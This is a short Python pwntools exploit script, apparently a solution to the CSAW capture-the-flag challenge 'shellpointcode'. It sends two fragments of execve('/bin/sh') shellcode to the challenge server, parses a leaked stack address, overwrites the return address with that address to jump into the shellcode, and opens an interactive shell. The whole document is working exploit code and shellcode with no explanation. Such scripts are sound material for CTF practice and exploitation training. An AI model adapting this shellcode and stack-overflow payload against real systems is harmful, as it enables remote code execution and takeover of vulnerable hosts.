from pwn import *
import codecs
#p = process('./shellpointcode')

elf = ELF('./shellpointcode')
offset  = 11

# shellcode2 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1"
# shellcode1 = "\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
shellcode1 = "\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode2 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff"+"\xeb\x12"
p = remote('pwn.chal.csaw.io' ,9005)
p.recvuntil('1:')
p.sendline(shellcode1)
p.recvuntil('2:')
p.sendline(shellcode2)
p.recvuntil('node.next: ')
leak = int(p.recvline(False), 16)

payload = "A"*11
payload += p64(leak+8)
print(payload)
#payload += shellcode

p.sendline(payload)
p.recv()

p.interactive()

